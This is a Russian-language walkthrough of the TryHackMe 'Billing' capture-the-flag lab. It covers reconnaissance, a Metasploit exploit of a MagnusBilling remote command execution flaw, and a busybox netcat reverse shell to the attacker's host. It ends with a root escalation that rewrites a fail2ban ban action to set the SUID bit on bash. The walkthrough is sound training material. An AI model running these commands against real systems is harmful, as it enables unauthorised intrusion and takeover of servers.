# Billing
- https://tryhackme.com/room/billing
## Разведка

Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- Cканирование версий

```
└─$ nmap -sC -sV 10.82.181.154
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 20:03 +0300
Nmap scan report for 10.82.181.154
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 57:97:1e:18:86:84:7d:79:6f:ec:ed:b5:18:6f:60:d6 (ECDSA)
|_  256 df:d4:a0:c9:37:45:4b:b4:7e:19:45:1d:99:56:07:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.82.181.154/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
```

Сам сайт на 80 порту не представляет ничего особенного, я по изучал код и наткнулся на CMS magnus, посмотрим, что на него есть в метасплойте и попробуем это использовать

```
msf > serach magnus
[-] Unknown command: serach. Did you mean search? Run the help command for more details.
msf > search magnus

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258                                                        
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

msf > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                         ort][...]. Supported proxies: socks4, socks5, socks
                                         5h, http, sapni
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                         /docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is random
                                         ly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
                                       s must be an address on the local machine or 0.0.0.0
                                       to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. Webshell na
                                        me will be randomly generated if left unset.


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP



View the full module info with the info, or info -d command.

msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST http://10.82.146.31/mbilling/
RHOST => http://10.82.146.31/mbilling/
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST 10.82.146.31
RHOST => 10.82.146.31
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST tun0
LHOST => 192.168.155.3
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 192.168.155.3:4444                                                     
[*] Running automatic check ("set AutoCheck false" to disable)                                            
[*] Checking if 10.82.146.31:80 can be exploited.                                                         
[*] Performing command injection test issuing a sleep command of 5 seconds.                               
[*] Elapsed time: 5.23 seconds.                                                                           
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (42137 bytes) to 10.82.146.31
[+] Deleted yZkqeGoPTamFZQ.php
[*] Meterpreter session 1 opened (192.168.155.3:4444 -> 10.82.146.31:32832) at 2026-01-30 20:29:10 +0300
```

## USER
```
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2434 created.
Channel 0 created.
ls
icepay-cc.php
icepay-ddebit.php
icepay-directebank.php
icepay-giropay.php
icepay-ideal.php
icepay-mistercash.php
icepay-paypal.php
icepay-paysafecard.php
icepay-phone.php
icepay-sms.php
icepay-wire.php
icepay.php
null
id     
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
busybox nc 192.168.155.3 6666 -e /bin/bash
```
Отлично! Вообще халява, просто уязвимость в magnus
Открываем у себя порт командой `nc -lvnp 6666`

И выше я на машину прокинул команду `busybox nc 192.168.155.3 6666 -e /bin/bash`

Для получения шелла по лучше

Улучшаю шелл командой, это делает его интерактивным
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Читаем первый флаг
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
asterisk@ip-10-82-146-31:/var/www/html/mbilling/lib/icepay$ cd /home
cd /home
asterisk@ip-10-82-146-31:/home$ ls
ls
debian  magnus  ssm-user
asterisk@ip-10-82-146-31:/home$ cd magnus   
cd magnus
asterisk@ip-10-82-146-31:/home/magnus$ ls
ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
asterisk@ip-10-82-146-31:/home/magnus$ cat user.txt
cat user.txt
THM{REDACTED}
asterisk@ip-10-82-146-31:/home/magnus$ 
```
## ROOT
Смотрим что умеем
```
asterisk@ip-10-82-146-31:/var/www/html/mbilling/lib/icepay$ sudo -l
sudo -l
Matching Defaults entries for asterisk on ip-10-82-146-31:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-82-146-31:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Мы можем использовать fail2ban-client

>**fail2ban-client** — это утилита управления сервисом **Fail2Ban** из командной строки.
Если коротко:
**Fail2Ban** — это демон, который мониторит логи (ssh, nginx, apache и т.д.) и **банит IP**, с которых идут подозрительные попытки (брутфорс, сканирование, спам логинов).
**fail2ban-client** — это “пульт управления” этим демоном.

Посмотрим что мы можем сделать:
- https://juggernaut-sec.com/fail2ban-lpe/

Смотрим запущен ли он вобще:
```
asterisk@ip-10-82-146-31:/var/www/html/mbilling/lib/icepay$ ps -aux | grep fail
<r/www/html/mbilling/lib/icepay$ ps -aux | grep fail        
root         854  0.2  1.5 1171732 31100 ?       Ssl  07:21   0:05 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
asterisk    3004  0.0  0.0   6684  1908 pts/5    S+   08:02   0:00 grep fail

```
Запущен и рутом и asterisk-ом

```
asterisk@ip-10-82-146-31:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client status
<ng/lib/icepay$ sudo /usr/bin/fail2ban-client status        
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
asterisk@ip-10-82-146-31:/var/www/html/mbilling/lib/icepay$ cd /etc/fail2ban/          
cd /etc/fail2ban/
asterisk@ip-10-82-146-31:/etc/fail2ban$ ls -la
ls -la
total 100
drwxr-xr-x   6 root root  4096 May 28  2025 .
drwxr-xr-x 146 root root 12288 Jan 30 07:21 ..
drwxr-xr-x   2 root root 12288 May 28  2025 action.d
-rw-r--r--   1 root root  3017 Nov  9  2022 fail2ban.conf
drwxr-xr-x   2 root root  4096 Jul 11  2021 fail2ban.d
drwxr-xr-x   3 root root 12288 May 28  2025 filter.d
-rw-r--r--   1 root root 25607 Nov  9  2022 jail.conf
drwxr-xr-x   2 root root  4096 May 28  2025 jail.d
-rw-r--r--   1 root root  1647 Mar 27  2024 jail.local
-rw-r--r--   1 root root   645 Nov 23  2020 paths-arch.conf
-rw-r--r--   1 root root  2728 Nov  9  2022 paths-common.conf
-rw-r--r--   1 root root   627 Nov  9  2022 paths-debian.conf
-rw-r--r--   1 root root   738 Nov 23  2020 paths-opensuse.conf
```
Jail - правило, при котором fail2ban реагирует на события и выполняет действие

```
asterisk@ip-10-82-146-31:/etc/fail2ban$ cat jail.local
cat jail.local

[DEFAULT]
ignoreip = 127.0.0.1
bantime  = 600
findtime  = 600
maxretry = 3
backend = auto
usedns = warn


[asterisk-iptables]   
enabled  = true           
filter   = asterisk       
action   = iptables-allports[name=ASTERISK, port=all, protocol=all]   
logpath  = /var/log/asterisk/messages 
maxretry = 5  
bantime = 600

[ast-cli-attck]   
enabled  = true           
filter   = asterisk_cli     
action   = iptables-allports[name=AST_CLI_Attack, port=all, protocol=all]
logpath  = /var/log/asterisk/messages 
maxretry = 1  
bantime = -1

[asterisk-manager]   
enabled  = true           
filter   = asterisk_manager     
action   = iptables-allports[name=AST_MANAGER, port=all, protocol=all]
logpath  = /var/log/asterisk/messages 
maxretry = 1  
bantime = -1

[ast-hgc-200]
enabled  = true           
filter   = asterisk_hgc_200     
action   = iptables-allports[name=AST_HGC_200, port=all, protocol=all]
logpath  = /var/log/asterisk/messages
maxretry = 20
bantime = -1

[mbilling_login]
enabled  = true
filter   = mbilling_login
action   = iptables-allports[name=mbilling_login, port=all, protocol=all]
logpath  = /var/www/html/mbilling/protected/runtime/application.log
maxretry = 3
bantime = 300

[ip-blacklist]
enabled   = true
filter    = ip-blacklist
action    = iptables-allports[name=ASTERISK, protocol=all] 
logpath   = /var/www/html/mbilling/resources/ip.blacklist
maxretry  = 0
findtime  = 15552000
bantime   = -1


[sshd]
enablem=true

[mbilling_ddos]
enabled  = true
filter   = mbilling_ddos
action   = iptables-allports[name=mbilling_ddos, port=all, protocol=all]
logpath  = /var/log/apache2/error.log
maxretry = 20
bantime = 3600
```
- action использует iptables

```
asterisk@ip-10-82-146-31:/etc/fail2ban$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
<r/bin/fail2ban-client get asterisk-iptables actions
The jail asterisk-iptables has the following actions:
iptables-allports-ASTERISK
asterisk@ip-10-82-146-31:/etc/fail2ban$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<ptables action iptables-allports-ASTERISK actionban
<iptables> -I f2b-ASTERISK 1 -s <ip> -j <blocktype>

```
И это ключевой момент: мы видим какая именно команда выполняется от имени root

Теперь мы возьмем и подменим эту команду:
```
asterisk@ip-10-82-146-31:/etc/fail2ban$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
<es-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
asterisk@ip-10-82-146-31:/etc/fail2ban$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
<ptables action iptables-allports-ASTERISK actionban
chmod +s /bin/bash
```

```
asterisk@ip-10-82-146-31:/etc/fail2ban$ ls -la /bin/bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 18  2025 /bin/bash
asterisk@ip-10-82-146-31:/etc/fail2ban$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4
<fail2ban-client set asterisk-iptables banip 1.2.3.4
1
asterisk@ip-10-82-146-31:/etc/fail2ban$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
asterisk@ip-10-82-146-31:/etc/fail2ban$ /bin/bash -p
/bin/bash -p
bash-5.2# whoami
whoami
root
bash-5.2# cat /root/root.txt
cat /root/root.txt
THM{REDACTED}
bash-5.2# 
```
Итог: мы поменяли команду которая выполняется от имени рут при бане ip, заблокировани случайный ip и смогли запустить /bin/bash от имени root
